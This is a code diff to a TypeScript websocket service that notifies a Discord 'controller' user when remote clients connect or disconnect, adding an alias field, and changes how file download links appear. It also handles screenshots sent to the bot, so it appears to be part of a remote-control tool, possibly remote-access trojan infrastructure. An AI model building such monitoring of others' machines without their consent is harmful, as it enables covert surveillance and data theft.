@@ -41,70 +41,86 @@ export default class WsService {
 		// 	}
 		// });
 
-		ws.on("disconnectedClient", async (data: { controllerid: string; clientid: string }) => {
-			try {
-				const { controllerid, clientid } = data;
+		ws.on(
+			"disconnectedClient",
+			async (data: { controllerid: string; clientid: string; alias: string }) => {
+				try {
+					const { controllerid, clientid, alias } = data;
 
-				if (!controllerid || controllerid === "null") {
-					Logger.warn("Invalid controller ID received");
-					return;
+					if (!controllerid || controllerid === "null") {
+						Logger.warn("Invalid controller ID received");
+						return;
+					}
+
+					const owner = await client.users.fetch(controllerid);
+					if (owner) {
+						const embed = {
+							title: "Client Disconnected",
+							description: `A client has been disconnected from your session`,
+							fields: [
+								{
+									name: "Alias",
+									value: alias,
+									inline: false
+								},
+								{
+									name: "Client ID",
+									value: clientid,
+									inline: false
+								}
+							],
+							color: 0xff0000,
+							timestamp: new Date().toISOString()
+						};
+
+						await owner.send({ embeds: [embed] });
+						Logger.info(`Client with ID: ${clientid} disconnected`);
+					} else {
+						Logger.warn(`Owner not found for ID: ${controllerid}`);
+					}
+				} catch (error) {
+					Logger.error("Error sending message", error);
 				}
-
-				const owner = await client.users.fetch(controllerid);
-				if (owner) {
-					const embed = {
-						title: "Client Disconnected",
-						description: `A client has been disconnected from your session`,
-						fields: [
-							{
-								name: "Client ID",
-								value: clientid,
-								inline: true
-							}
-						],
-						color: 0xff0000,
-						timestamp: new Date().toISOString()
-					};
-
-					await owner.send({ embeds: [embed] });
-					Logger.info(`Client with ID: ${clientid} disconnected`);
-				} else {
-					Logger.warn(`Owner not found for ID: ${controllerid}`);
-				}
-			} catch (error) {
-				Logger.error("Error sending message", error);
 			}
-		});
+		);
 
-		ws.on("connectedClient", async (data: { controllerid: string; clientid: string }) => {
-			try {
-				const { controllerid, clientid } = data;
+		ws.on(
+			"connectedClient",
+			async (data: { controllerid: string; clientid: string; alias: string }) => {
+				try {
+					const { controllerid, clientid, alias } = data;
 
-				const owner = await client.users.fetch(controllerid);
-				if (owner) {
-					const embed = {
-						title: "Client Connected",
-						description: `A client has successfully connected `,
-						fields: [
-							{
-								name: "Client ID",
-								value: clientid,
-								inline: true
-							}
-						],
-						color: 0x00ff00,
-						timestamp: new Date().toISOString()
-					};
-					Logger.info(`Client with ID: ${clientid} connected`);
+					const owner = await client.users.fetch(controllerid);
+					if (owner) {
+						const embed = {
+							title: "Client Connected",
+							description: `A client has successfully connected `,
+							fields: [
+								{
+									name: "Alias",
+									value: alias,
+									inline: false
+								},
+								{
+									name: "Client ID",
+									value: clientid,
+									inline: false
+								}
+							],
+							color: 0x00ff00,
+							timestamp: new Date().toISOString()
+						};
+						Logger.info(`Client with ID: ${clientid} connected`);
 
-					await owner.send({ embeds: [embed] });
-				} else {
-					Logger.warn(`Owner not found for ID: ${controllerid}`);
+						await owner.send({ embeds: [embed] });
+					} else {
+						Logger.warn(`Owner not found for ID: ${controllerid}`);
+					}
+				} catch (error) {
+					Logger.error("Error sending message", error);
 				}
-			} catch (error) {
-				Logger.error("Error sending message", error);
 			}
-		});
+		);
 
 		ws.on(
 			"sendScreenshotToBot",
@@ -271,7 +287,8 @@ export default class WsService {
 							Logger.info("File too large, only sending link");
 							const embed = {
 								title: "File Download Link",
-								description: `[Click here to download the file](${file})`,
+								// description: `[Click here to download the file](${file})`,
+								description: `${file}`,
 								color: embeds.Colors.default,
 								timestamp: new Date().toISOString()
 							};
